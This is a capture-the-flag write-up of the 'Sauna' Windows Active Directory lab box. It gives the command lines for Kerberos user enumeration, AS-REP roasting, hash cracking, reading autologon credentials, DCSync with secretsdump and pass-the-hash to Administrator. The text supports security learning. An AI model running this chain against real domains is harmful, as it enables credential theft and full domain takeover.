#Windows #ActiveDirectory #LDAP #Kerbrute #ASREPRoast #hashcat #WinRM #WinPEAS #BloodHound #DCSync #secretsdump #PassTheHash

## Overview

Sauna is an easy Windows AD box that walks the full domain-compromise path: build a user list from a website and Kerberos brute force, **AS-REP roast** an account, find autologon credentials with WinPEAS, then abuse **DCSync** rights to dump the Administrator hash and pass it. It's a close cousin of Forest and reinforces the same AD fundamentals.

> **Screenshot would help here:** the privesc hinges on BloodHound showing `svc_loanmgr` with GetChanges/GetChangesAll (DCSync) on the domain. A screenshot of that node's outbound rights makes the escalation obvious.

## Recon

The site is a bank with employee names but little else technically. LDAP gave the domain naming context but no anonymous user dump, so I brute-forced usernames with Kerbrute against a name-based pattern:

```sh
ldapsearch -x -h 10.10.10.175 -s base namingcontexts   ->   DC=EGOTISTICAL-BANK,DC=LOCAL
kerbrute userenum -d EGOTISTICAL-BANK.LOCAL xato-net-10-million-usernames.txt --dc 10.10.10.175
->  administrator, hsmith, fsmith, sauna
```

> **Why Kerbrute:** it validates usernames via Kerberos pre-auth responses without logging failed logons the way SMB does, quiet user enumeration. Employee full names from the site shape the wordlist (`fsmith` = F. Smith).

## Foothold

### AS-REP Roasting fsmith

Requesting AS-REP tickets for the user list returned a crackable hash for `fsmith` (pre-auth not required):

```sh
impacket-getNPUsers 'EGOTISTICAL-BANK.LOCAL/' -usersfile users.txt -format hashcat -dc-ip 10.10.10.175
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:‹redacted›
```

```sh
hashcat -m 18200 hashes rockyou.txt   ->   fsmith : ‹redacted›
evil-winrm -i 10.10.10.175 -u fsmith -p ‹redacted›
```

## Privilege Escalation

### Autologon Creds → DCSync

WinPEAS found **autologon** credentials stored in the registry in plaintext:

```
svc_loanmanager : ‹redacted›
```

> **Why autologon leaks creds:** when Windows is configured to log in automatically, it stores `DefaultUserName`/`DefaultPassword` in cleartext under `HKLM\...\Winlogon`. WinPEAS reads them directly. This handed me the `svc_loanmgr` account.

BloodHound showed `svc_loanmgr` holds **GetChanges** and **GetChangesAll** on the domain, the two rights that together permit **DCSync**. So I replicated the Administrator hash:

```sh
impacket-secretsdump 'svc_loanmgr:‹redacted›@10.10.10.175'
Administrator NTLM: ‹redacted›
```

## Root

Pass-the-hash as Administrator (any of wmiexec / psexec / evil-winrm):

```sh
evil-winrm -i 10.10.10.175 -u administrator -H ‹redacted›
```

Box rooted.

## Takeaways

- **Turn names into usernames.** Website employee names + Kerbrute produced the valid user list.
- **AS-REP roasting** again provides a credential with zero prior access.
- **Autologon stores passwords in cleartext**, WinPEAS surfaces them instantly.
- **GetChanges + GetChangesAll = DCSync = domain admin.** Replicate the Administrator hash and pass it.
